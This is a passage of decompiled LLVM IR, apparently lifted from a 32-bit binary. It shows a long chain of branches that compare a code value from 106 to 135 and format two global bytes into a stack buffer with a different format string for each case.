  %v5_804aea1 = call i32 @szprintf(i32 %v2_804ae9a, i32 ptrtoint ([13 x i8]* @global_var_8058abc.132 to i32), i32 %v1_804ae8b, i32 %v1_804ae7f)
  br label %dec_label_pc_804aea9

dec_label_pc_804aea9:                             ; preds = %dec_label_pc_804ae79, %dec_label_pc_804ae7f
  %v12_804aea9 = icmp eq i32 %v11_8049ac4, 106
  %v1_804aead = icmp eq i1 %v12_804aea9, false
  br i1 %v1_804aead, label %dec_label_pc_804aed9, label %dec_label_pc_804aeaf

dec_label_pc_804aeaf:                             ; preds = %dec_label_pc_804aea9
  %v0_804aeaf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804aeaf = zext i8 %v0_804aeaf to i32
  store i32 %v1_804aeaf, i32* @edx, align 4
  %v0_804aebb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804aebb = zext i8 %v0_804aebb to i32
  %v2_804aeca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aeca, i32* @ebx, align 4
  %v5_804aed1 = call i32 @szprintf(i32 %v2_804aeca, i32 ptrtoint ([12 x i8]* @global_var_8058ac9.133 to i32), i32 %v1_804aebb, i32 %v1_804aeaf)
  br label %dec_label_pc_804aed9

dec_label_pc_804aed9:                             ; preds = %dec_label_pc_804aea9, %dec_label_pc_804aeaf
  %v12_804aed9 = icmp eq i32 %v11_8049ac4, 107
  %v1_804aedd = icmp eq i1 %v12_804aed9, false
  br i1 %v1_804aedd, label %dec_label_pc_804af09, label %dec_label_pc_804aedf

dec_label_pc_804aedf:                             ; preds = %dec_label_pc_804aed9
  %v0_804aedf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804aedf = zext i8 %v0_804aedf to i32
  store i32 %v1_804aedf, i32* @edx, align 4
  %v0_804aeeb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804aeeb = zext i8 %v0_804aeeb to i32
  %v2_804aefa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aefa, i32* @ebx, align 4
  %v5_804af01 = call i32 @szprintf(i32 %v2_804aefa, i32 ptrtoint ([13 x i8]* @global_var_8058ad5.134 to i32), i32 %v1_804aeeb, i32 %v1_804aedf)
  br label %dec_label_pc_804af09

dec_label_pc_804af09:                             ; preds = %dec_label_pc_804aed9, %dec_label_pc_804aedf
  %v12_804af09 = icmp eq i32 %v11_8049ac4, 108
  %v1_804af0d = icmp eq i1 %v12_804af09, false
  br i1 %v1_804af0d, label %dec_label_pc_804af39, label %dec_label_pc_804af0f

dec_label_pc_804af0f:                             ; preds = %dec_label_pc_804af09
  %v0_804af0f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804af0f = zext i8 %v0_804af0f to i32
  store i32 %v1_804af0f, i32* @edx, align 4
  %v0_804af1b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804af1b = zext i8 %v0_804af1b to i32
  %v2_804af2a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af2a, i32* @ebx, align 4
  %v5_804af31 = call i32 @szprintf(i32 %v2_804af2a, i32 ptrtoint ([14 x i8]* @global_var_8058ae2.135 to i32), i32 %v1_804af1b, i32 %v1_804af0f)
  br label %dec_label_pc_804af39

dec_label_pc_804af39:                             ; preds = %dec_label_pc_804af09, %dec_label_pc_804af0f
  %v12_804af39 = icmp eq i32 %v11_8049ac4, 109
  %v1_804af3d = icmp eq i1 %v12_804af39, false
  br i1 %v1_804af3d, label %dec_label_pc_804af69, label %dec_label_pc_804af3f

dec_label_pc_804af3f:                             ; preds = %dec_label_pc_804af39
  %v0_804af3f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804af3f = zext i8 %v0_804af3f to i32
  store i32 %v1_804af3f, i32* @edx, align 4
  %v0_804af4b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804af4b = zext i8 %v0_804af4b to i32
  %v2_804af5a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af5a, i32* @ebx, align 4
  %v5_804af61 = call i32 @szprintf(i32 %v2_804af5a, i32 ptrtoint ([14 x i8]* @global_var_8058af0.136 to i32), i32 %v1_804af4b, i32 %v1_804af3f)
  br label %dec_label_pc_804af69

dec_label_pc_804af69:                             ; preds = %dec_label_pc_804af39, %dec_label_pc_804af3f
  %v12_804af69 = icmp eq i32 %v11_8049ac4, 110
  %v1_804af6d = icmp eq i1 %v12_804af69, false
  br i1 %v1_804af6d, label %dec_label_pc_804af99, label %dec_label_pc_804af6f

dec_label_pc_804af6f:                             ; preds = %dec_label_pc_804af69
  %v0_804af6f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804af6f = zext i8 %v0_804af6f to i32
  store i32 %v1_804af6f, i32* @edx, align 4
  %v0_804af7b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804af7b = zext i8 %v0_804af7b to i32
  %v2_804af8a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af8a, i32* @ebx, align 4
  %v5_804af91 = call i32 @szprintf(i32 %v2_804af8a, i32 ptrtoint ([13 x i8]* @global_var_8058afe.137 to i32), i32 %v1_804af7b, i32 %v1_804af6f)
  br label %dec_label_pc_804af99

dec_label_pc_804af99:                             ; preds = %dec_label_pc_804af69, %dec_label_pc_804af6f
  %v12_804af99 = icmp eq i32 %v11_8049ac4, 111
  %v1_804af9d = icmp eq i1 %v12_804af99, false
  br i1 %v1_804af9d, label %dec_label_pc_804afc9, label %dec_label_pc_804af9f

dec_label_pc_804af9f:                             ; preds = %dec_label_pc_804af99
  %v0_804af9f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804af9f = zext i8 %v0_804af9f to i32
  store i32 %v1_804af9f, i32* @edx, align 4
  %v0_804afab = load i8, i8* @global_var_805d499.29, align 1
  %v1_804afab = zext i8 %v0_804afab to i32
  %v2_804afba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afba, i32* @ebx, align 4
  %v5_804afc1 = call i32 @szprintf(i32 %v2_804afba, i32 ptrtoint ([14 x i8]* @global_var_8058b0b.138 to i32), i32 %v1_804afab, i32 %v1_804af9f)
  br label %dec_label_pc_804afc9

dec_label_pc_804afc9:                             ; preds = %dec_label_pc_804af99, %dec_label_pc_804af9f
  %v9_804afc9 = icmp eq i32 %v11_8049ac4, 112
  %v1_804afcd = icmp eq i1 %v9_804afc9, false
  br i1 %v1_804afcd, label %dec_label_pc_804aff9, label %dec_label_pc_804afcf

dec_label_pc_804afcf:                             ; preds = %dec_label_pc_804afc9
  %v0_804afcf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804afcf = zext i8 %v0_804afcf to i32
  store i32 %v1_804afcf, i32* @edx, align 4
  %v0_804afdb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804afdb = zext i8 %v0_804afdb to i32
  %v2_804afea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afea, i32* @ebx, align 4
  %v5_804aff1 = call i32 @szprintf(i32 %v2_804afea, i32 ptrtoint ([14 x i8]* @global_var_8058b19.139 to i32), i32 %v1_804afdb, i32 %v1_804afcf)
  br label %dec_label_pc_804aff9

dec_label_pc_804aff9:                             ; preds = %dec_label_pc_804afc9, %dec_label_pc_804afcf
  %v12_804aff9 = icmp eq i32 %v11_8049ac4, 113
  %v1_804affd = icmp eq i1 %v12_804aff9, false
  br i1 %v1_804affd, label %dec_label_pc_804b029, label %dec_label_pc_804afff

dec_label_pc_804afff:                             ; preds = %dec_label_pc_804aff9
  %v0_804afff = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804afff = zext i8 %v0_804afff to i32
  store i32 %v1_804afff, i32* @edx, align 4
  %v0_804b00b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b00b = zext i8 %v0_804b00b to i32
  %v2_804b01a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b01a, i32* @ebx, align 4
  %v5_804b021 = call i32 @szprintf(i32 %v2_804b01a, i32 ptrtoint ([13 x i8]* @global_var_8058b27.140 to i32), i32 %v1_804b00b, i32 %v1_804afff)
  br label %dec_label_pc_804b029

dec_label_pc_804b029:                             ; preds = %dec_label_pc_804aff9, %dec_label_pc_804afff
  %v12_804b029 = icmp eq i32 %v11_8049ac4, 114
  %v1_804b02d = icmp eq i1 %v12_804b029, false
  br i1 %v1_804b02d, label %dec_label_pc_804b059, label %dec_label_pc_804b02f

dec_label_pc_804b02f:                             ; preds = %dec_label_pc_804b029
  %v0_804b02f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b02f = zext i8 %v0_804b02f to i32
  store i32 %v1_804b02f, i32* @edx, align 4
  %v0_804b03b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b03b = zext i8 %v0_804b03b to i32
  %v2_804b04a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b04a, i32* @ebx, align 4
  %v5_804b051 = call i32 @szprintf(i32 %v2_804b04a, i32 ptrtoint ([14 x i8]* @global_var_8058b34.141 to i32), i32 %v1_804b03b, i32 %v1_804b02f)
  br label %dec_label_pc_804b059

dec_label_pc_804b059:                             ; preds = %dec_label_pc_804b029, %dec_label_pc_804b02f
  %v12_804b059 = icmp eq i32 %v11_8049ac4, 115
  %v1_804b05d = icmp eq i1 %v12_804b059, false
  br i1 %v1_804b05d, label %dec_label_pc_804b089, label %dec_label_pc_804b05f

dec_label_pc_804b05f:                             ; preds = %dec_label_pc_804b059
  %v0_804b05f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b05f = zext i8 %v0_804b05f to i32
  store i32 %v1_804b05f, i32* @edx, align 4
  %v0_804b06b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b06b = zext i8 %v0_804b06b to i32
  %v2_804b07a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b07a, i32* @ebx, align 4
  %v5_804b081 = call i32 @szprintf(i32 %v2_804b07a, i32 ptrtoint ([13 x i8]* @global_var_8058b42.142 to i32), i32 %v1_804b06b, i32 %v1_804b05f)
  br label %dec_label_pc_804b089

dec_label_pc_804b089:                             ; preds = %dec_label_pc_804b059, %dec_label_pc_804b05f
  %v12_804b089 = icmp eq i32 %v11_8049ac4, 116
  %v1_804b08d = icmp eq i1 %v12_804b089, false
  br i1 %v1_804b08d, label %dec_label_pc_804b0b9, label %dec_label_pc_804b08f

dec_label_pc_804b08f:                             ; preds = %dec_label_pc_804b089
  %v0_804b08f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b08f = zext i8 %v0_804b08f to i32
  store i32 %v1_804b08f, i32* @edx, align 4
  %v0_804b09b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b09b = zext i8 %v0_804b09b to i32
  %v2_804b0aa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0aa, i32* @ebx, align 4
  %v5_804b0b1 = call i32 @szprintf(i32 %v2_804b0aa, i32 ptrtoint ([13 x i8]* @global_var_8058b4f.143 to i32), i32 %v1_804b09b, i32 %v1_804b08f)
  br label %dec_label_pc_804b0b9

dec_label_pc_804b0b9:                             ; preds = %dec_label_pc_804b089, %dec_label_pc_804b08f
  %v12_804b0b9 = icmp eq i32 %v11_8049ac4, 117
  %v1_804b0bd = icmp eq i1 %v12_804b0b9, false
  br i1 %v1_804b0bd, label %dec_label_pc_804b0e9, label %dec_label_pc_804b0bf

dec_label_pc_804b0bf:                             ; preds = %dec_label_pc_804b0b9
  %v0_804b0bf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b0bf = zext i8 %v0_804b0bf to i32
  store i32 %v1_804b0bf, i32* @edx, align 4
  %v0_804b0cb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b0cb = zext i8 %v0_804b0cb to i32
  %v2_804b0da = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0da, i32* @ebx, align 4
  %v5_804b0e1 = call i32 @szprintf(i32 %v2_804b0da, i32 ptrtoint ([14 x i8]* @global_var_8058b5c.144 to i32), i32 %v1_804b0cb, i32 %v1_804b0bf)
  br label %dec_label_pc_804b0e9

dec_label_pc_804b0e9:                             ; preds = %dec_label_pc_804b0b9, %dec_label_pc_804b0bf
  %v12_804b0e9 = icmp eq i32 %v11_8049ac4, 118
  %v1_804b0ed = icmp eq i1 %v12_804b0e9, false
  br i1 %v1_804b0ed, label %dec_label_pc_804b119, label %dec_label_pc_804b0ef

dec_label_pc_804b0ef:                             ; preds = %dec_label_pc_804b0e9
  %v0_804b0ef = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b0ef = zext i8 %v0_804b0ef to i32
  store i32 %v1_804b0ef, i32* @edx, align 4
  %v0_804b0fb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b0fb = zext i8 %v0_804b0fb to i32
  %v2_804b10a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b10a, i32* @ebx, align 4
  %v5_804b111 = call i32 @szprintf(i32 %v2_804b10a, i32 ptrtoint ([14 x i8]* @global_var_8058b6a.145 to i32), i32 %v1_804b0fb, i32 %v1_804b0ef)
  br label %dec_label_pc_804b119

dec_label_pc_804b119:                             ; preds = %dec_label_pc_804b0e9, %dec_label_pc_804b0ef
  %v12_804b119 = icmp eq i32 %v11_8049ac4, 119
  %v1_804b11d = icmp eq i1 %v12_804b119, false
  br i1 %v1_804b11d, label %dec_label_pc_804b149, label %dec_label_pc_804b11f

dec_label_pc_804b11f:                             ; preds = %dec_label_pc_804b119
  %v0_804b11f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b11f = zext i8 %v0_804b11f to i32
  store i32 %v1_804b11f, i32* @edx, align 4
  %v0_804b12b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b12b = zext i8 %v0_804b12b to i32
  %v2_804b13a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b13a, i32* @ebx, align 4
  %v5_804b141 = call i32 @szprintf(i32 %v2_804b13a, i32 ptrtoint ([14 x i8]* @global_var_8058b78.146 to i32), i32 %v1_804b12b, i32 %v1_804b11f)
  br label %dec_label_pc_804b149

dec_label_pc_804b149:                             ; preds = %dec_label_pc_804b119, %dec_label_pc_804b11f
  %v12_804b149 = icmp eq i32 %v11_8049ac4, 120
  %v1_804b14d = icmp eq i1 %v12_804b149, false
  br i1 %v1_804b14d, label %dec_label_pc_804b179, label %dec_label_pc_804b14f

dec_label_pc_804b14f:                             ; preds = %dec_label_pc_804b149
  %v0_804b14f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b14f = zext i8 %v0_804b14f to i32
  store i32 %v1_804b14f, i32* @edx, align 4
  %v0_804b15b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b15b = zext i8 %v0_804b15b to i32
  %v2_804b16a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b16a, i32* @ebx, align 4
  %v5_804b171 = call i32 @szprintf(i32 %v2_804b16a, i32 ptrtoint ([14 x i8]* @global_var_8058b86.147 to i32), i32 %v1_804b15b, i32 %v1_804b14f)
  br label %dec_label_pc_804b179

dec_label_pc_804b179:                             ; preds = %dec_label_pc_804b149, %dec_label_pc_804b14f
  %v12_804b179 = icmp eq i32 %v11_8049ac4, 121
  %v1_804b17d = icmp eq i1 %v12_804b179, false
  br i1 %v1_804b17d, label %dec_label_pc_804b1a9, label %dec_label_pc_804b17f

dec_label_pc_804b17f:                             ; preds = %dec_label_pc_804b179
  %v0_804b17f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b17f = zext i8 %v0_804b17f to i32
  store i32 %v1_804b17f, i32* @edx, align 4
  %v0_804b18b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b18b = zext i8 %v0_804b18b to i32
  %v2_804b19a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b19a, i32* @ebx, align 4
  %v5_804b1a1 = call i32 @szprintf(i32 %v2_804b19a, i32 ptrtoint ([14 x i8]* @global_var_8058ae2.135 to i32), i32 %v1_804b18b, i32 %v1_804b17f)
  br label %dec_label_pc_804b1a9

dec_label_pc_804b1a9:                             ; preds = %dec_label_pc_804b179, %dec_label_pc_804b17f
  %v12_804b1a9 = icmp eq i32 %v11_8049ac4, 122
  %v1_804b1ad = icmp eq i1 %v12_804b1a9, false
  br i1 %v1_804b1ad, label %dec_label_pc_804b1d9, label %dec_label_pc_804b1af

dec_label_pc_804b1af:                             ; preds = %dec_label_pc_804b1a9
  %v0_804b1af = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b1af = zext i8 %v0_804b1af to i32
  store i32 %v1_804b1af, i32* @edx, align 4
  %v0_804b1bb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b1bb = zext i8 %v0_804b1bb to i32
  %v2_804b1ca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1ca, i32* @ebx, align 4
  %v5_804b1d1 = call i32 @szprintf(i32 %v2_804b1ca, i32 ptrtoint ([13 x i8]* @global_var_8058b94.148 to i32), i32 %v1_804b1bb, i32 %v1_804b1af)
  br label %dec_label_pc_804b1d9

dec_label_pc_804b1d9:                             ; preds = %dec_label_pc_804b1a9, %dec_label_pc_804b1af
  %v12_804b1d9 = icmp eq i32 %v11_8049ac4, 123
  %v1_804b1dd = icmp eq i1 %v12_804b1d9, false
  br i1 %v1_804b1dd, label %dec_label_pc_804b209, label %dec_label_pc_804b1df

dec_label_pc_804b1df:                             ; preds = %dec_label_pc_804b1d9
  %v0_804b1df = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b1df = zext i8 %v0_804b1df to i32
  store i32 %v1_804b1df, i32* @edx, align 4
  %v0_804b1eb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b1eb = zext i8 %v0_804b1eb to i32
  %v2_804b1fa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1fa, i32* @ebx, align 4
  %v5_804b201 = call i32 @szprintf(i32 %v2_804b1fa, i32 ptrtoint ([12 x i8]* @global_var_8058ba1.149 to i32), i32 %v1_804b1eb, i32 %v1_804b1df)
  br label %dec_label_pc_804b209

dec_label_pc_804b209:                             ; preds = %dec_label_pc_804b1d9, %dec_label_pc_804b1df
  %v12_804b209 = icmp eq i32 %v11_8049ac4, 124
  %v1_804b20d = icmp eq i1 %v12_804b209, false
  br i1 %v1_804b20d, label %dec_label_pc_804b239, label %dec_label_pc_804b20f

dec_label_pc_804b20f:                             ; preds = %dec_label_pc_804b209
  %v0_804b20f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b20f = zext i8 %v0_804b20f to i32
  store i32 %v1_804b20f, i32* @edx, align 4
  %v0_804b21b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b21b = zext i8 %v0_804b21b to i32
  %v2_804b22a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b22a, i32* @ebx, align 4
  %v5_804b231 = call i32 @szprintf(i32 %v2_804b22a, i32 ptrtoint ([14 x i8]* @global_var_8058bad.150 to i32), i32 %v1_804b21b, i32 %v1_804b20f)
  br label %dec_label_pc_804b239

dec_label_pc_804b239:                             ; preds = %dec_label_pc_804b209, %dec_label_pc_804b20f
  %v12_804b239 = icmp eq i32 %v11_8049ac4, 125
  %v1_804b23d = icmp eq i1 %v12_804b239, false
  br i1 %v1_804b23d, label %dec_label_pc_804b269, label %dec_label_pc_804b23f

dec_label_pc_804b23f:                             ; preds = %dec_label_pc_804b239
  %v0_804b23f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b23f = zext i8 %v0_804b23f to i32
  store i32 %v1_804b23f, i32* @edx, align 4
  %v0_804b24b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b24b = zext i8 %v0_804b24b to i32
  %v2_804b25a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b25a, i32* @ebx, align 4
  %v5_804b261 = call i32 @szprintf(i32 %v2_804b25a, i32 ptrtoint ([14 x i8]* @global_var_8058bbb.151 to i32), i32 %v1_804b24b, i32 %v1_804b23f)
  br label %dec_label_pc_804b269

dec_label_pc_804b269:                             ; preds = %dec_label_pc_804b239, %dec_label_pc_804b23f
  %v12_804b269 = icmp eq i32 %v11_8049ac4, 126
  %v1_804b26d = icmp eq i1 %v12_804b269, false
  br i1 %v1_804b26d, label %dec_label_pc_804b299, label %dec_label_pc_804b26f

dec_label_pc_804b26f:                             ; preds = %dec_label_pc_804b269
  %v0_804b26f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b26f = zext i8 %v0_804b26f to i32
  store i32 %v1_804b26f, i32* @edx, align 4
  %v0_804b27b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b27b = zext i8 %v0_804b27b to i32
  %v2_804b28a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b28a, i32* @ebx, align 4
  %v5_804b291 = call i32 @szprintf(i32 %v2_804b28a, i32 ptrtoint ([14 x i8]* @global_var_8058bad.150 to i32), i32 %v1_804b27b, i32 %v1_804b26f)
  br label %dec_label_pc_804b299

dec_label_pc_804b299:                             ; preds = %dec_label_pc_804b269, %dec_label_pc_804b26f
  %v12_804b299 = icmp eq i32 %v11_8049ac4, 127
  %v1_804b29d = icmp eq i1 %v12_804b299, false
  br i1 %v1_804b29d, label %dec_label_pc_804b2c9, label %dec_label_pc_804b29f

dec_label_pc_804b29f:                             ; preds = %dec_label_pc_804b299
  %v0_804b29f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b29f = zext i8 %v0_804b29f to i32
  store i32 %v1_804b29f, i32* @edx, align 4
  %v0_804b2ab = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b2ab = zext i8 %v0_804b2ab to i32
  %v2_804b2ba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2ba, i32* @ebx, align 4
  %v5_804b2c1 = call i32 @szprintf(i32 %v2_804b2ba, i32 ptrtoint ([14 x i8]* @global_var_8058bc9.152 to i32), i32 %v1_804b2ab, i32 %v1_804b29f)
  br label %dec_label_pc_804b2c9

dec_label_pc_804b2c9:                             ; preds = %dec_label_pc_804b299, %dec_label_pc_804b29f
  %v9_804b2c9 = icmp eq i32 %v11_8049ac4, 128
  %v1_804b2d0 = icmp eq i1 %v9_804b2c9, false
  br i1 %v1_804b2d0, label %dec_label_pc_804b2fc, label %dec_label_pc_804b2d2

dec_label_pc_804b2d2:                             ; preds = %dec_label_pc_804b2c9
  %v0_804b2d2 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b2d2 = zext i8 %v0_804b2d2 to i32
  store i32 %v1_804b2d2, i32* @edx, align 4
  %v0_804b2de = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b2de = zext i8 %v0_804b2de to i32
  %v2_804b2ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2ed, i32* @ebx, align 4
  %v5_804b2f4 = call i32 @szprintf(i32 %v2_804b2ed, i32 ptrtoint ([14 x i8]* @global_var_8058bd7.153 to i32), i32 %v1_804b2de, i32 %v1_804b2d2)
  br label %dec_label_pc_804b2fc

dec_label_pc_804b2fc:                             ; preds = %dec_label_pc_804b2c9, %dec_label_pc_804b2d2
  %v12_804b2fc = icmp eq i32 %v11_8049ac4, 129
  %v1_804b303 = icmp eq i1 %v12_804b2fc, false
  br i1 %v1_804b303, label %dec_label_pc_804b32f, label %dec_label_pc_804b305

dec_label_pc_804b305:                             ; preds = %dec_label_pc_804b2fc
  %v0_804b305 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b305 = zext i8 %v0_804b305 to i32
  store i32 %v1_804b305, i32* @edx, align 4
  %v0_804b311 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b311 = zext i8 %v0_804b311 to i32
  %v2_804b320 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b320, i32* @ebx, align 4
  %v5_804b327 = call i32 @szprintf(i32 %v2_804b320, i32 ptrtoint ([14 x i8]* @global_var_8058be5.154 to i32), i32 %v1_804b311, i32 %v1_804b305)
  br label %dec_label_pc_804b32f

dec_label_pc_804b32f:                             ; preds = %dec_label_pc_804b2fc, %dec_label_pc_804b305
  %v12_804b32f = icmp eq i32 %v11_8049ac4, 130
  %v1_804b336 = icmp eq i1 %v12_804b32f, false
  br i1 %v1_804b336, label %dec_label_pc_804b362, label %dec_label_pc_804b338

dec_label_pc_804b338:                             ; preds = %dec_label_pc_804b32f
  %v0_804b338 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b338 = zext i8 %v0_804b338 to i32
  store i32 %v1_804b338, i32* @edx, align 4
  %v0_804b344 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b344 = zext i8 %v0_804b344 to i32
  %v2_804b353 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b353, i32* @ebx, align 4
  %v5_804b35a = call i32 @szprintf(i32 %v2_804b353, i32 ptrtoint ([14 x i8]* @global_var_8058bf3.155 to i32), i32 %v1_804b344, i32 %v1_804b338)
  br label %dec_label_pc_804b362

dec_label_pc_804b362:                             ; preds = %dec_label_pc_804b32f, %dec_label_pc_804b338
  %v12_804b362 = icmp eq i32 %v11_8049ac4, 131
  %v1_804b369 = icmp eq i1 %v12_804b362, false
  br i1 %v1_804b369, label %dec_label_pc_804b395, label %dec_label_pc_804b36b

dec_label_pc_804b36b:                             ; preds = %dec_label_pc_804b362
  %v0_804b36b = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b36b = zext i8 %v0_804b36b to i32
  store i32 %v1_804b36b, i32* @edx, align 4
  %v0_804b377 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b377 = zext i8 %v0_804b377 to i32
  %v2_804b386 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b386, i32* @ebx, align 4
  %v5_804b38d = call i32 @szprintf(i32 %v2_804b386, i32 ptrtoint ([14 x i8]* @global_var_8058c01.156 to i32), i32 %v1_804b377, i32 %v1_804b36b)
  br label %dec_label_pc_804b395

dec_label_pc_804b395:                             ; preds = %dec_label_pc_804b362, %dec_label_pc_804b36b
  %v12_804b395 = icmp eq i32 %v11_8049ac4, 132
  %v1_804b39c = icmp eq i1 %v12_804b395, false
  br i1 %v1_804b39c, label %dec_label_pc_804b3c8, label %dec_label_pc_804b39e

dec_label_pc_804b39e:                             ; preds = %dec_label_pc_804b395
  %v0_804b39e = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b39e = zext i8 %v0_804b39e to i32
  store i32 %v1_804b39e, i32* @edx, align 4
  %v0_804b3aa = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b3aa = zext i8 %v0_804b3aa to i32
  %v2_804b3b9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3b9, i32* @ebx, align 4
  %v5_804b3c0 = call i32 @szprintf(i32 %v2_804b3b9, i32 ptrtoint ([14 x i8]* @global_var_8058c0f.157 to i32), i32 %v1_804b3aa, i32 %v1_804b39e)
  br label %dec_label_pc_804b3c8

dec_label_pc_804b3c8:                             ; preds = %dec_label_pc_804b395, %dec_label_pc_804b39e
  %v12_804b3c8 = icmp eq i32 %v11_8049ac4, 133
  %v1_804b3cf = icmp eq i1 %v12_804b3c8, false
  br i1 %v1_804b3cf, label %dec_label_pc_804b3fb, label %dec_label_pc_804b3d1

dec_label_pc_804b3d1:                             ; preds = %dec_label_pc_804b3c8
  %v0_804b3d1 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b3d1 = zext i8 %v0_804b3d1 to i32
  store i32 %v1_804b3d1, i32* @edx, align 4
  %v0_804b3dd = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b3dd = zext i8 %v0_804b3dd to i32
  %v2_804b3ec = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3ec, i32* @ebx, align 4
  %v5_804b3f3 = call i32 @szprintf(i32 %v2_804b3ec, i32 ptrtoint ([14 x i8]* @global_var_8058c1d.158 to i32), i32 %v1_804b3dd, i32 %v1_804b3d1)
  br label %dec_label_pc_804b3fb

dec_label_pc_804b3fb:                             ; preds = %dec_label_pc_804b3c8, %dec_label_pc_804b3d1
  %v12_804b3fb = icmp eq i32 %v11_8049ac4, 134
  %v1_804b402 = icmp eq i1 %v12_804b3fb, false
  br i1 %v1_804b402, label %dec_label_pc_804b42e, label %dec_label_pc_804b404

dec_label_pc_804b404:                             ; preds = %dec_label_pc_804b3fb
  %v0_804b404 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b404 = zext i8 %v0_804b404 to i32
  store i32 %v1_804b404, i32* @edx, align 4
  %v0_804b410 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b410 = zext i8 %v0_804b410 to i32
  %v2_804b41f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b41f, i32* @ebx, align 4
  %v5_804b426 = call i32 @szprintf(i32 %v2_804b41f, i32 ptrtoint ([14 x i8]* @global_var_8058c2b.159 to i32), i32 %v1_804b410, i32 %v1_804b404)
  br label %dec_label_pc_804b42e

dec_label_pc_804b42e:                             ; preds = %dec_label_pc_804b3fb, %dec_label_pc_804b404
  %v12_804b42e = icmp eq i32 %v11_8049ac4, 135
  %v1_804b435 = icmp eq i1 %v12_804b42e, false
  br i1 %v1_804b435, label %dec_label_pc_804b461, label %dec_label_pc_804b437

dec_label_pc_804b437:                             ; preds = %dec_label_pc_804b42e
  %v0_804b437 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b437 = zext i8 %v0_804b437 to i32
  store i32 %v1_804b437, i32* @edx, align 4
  %v0_804b443 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b443 = zext i8 %v0_804b443 to i32
  %v2_804b452 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b452, i32* @ebx, align 4
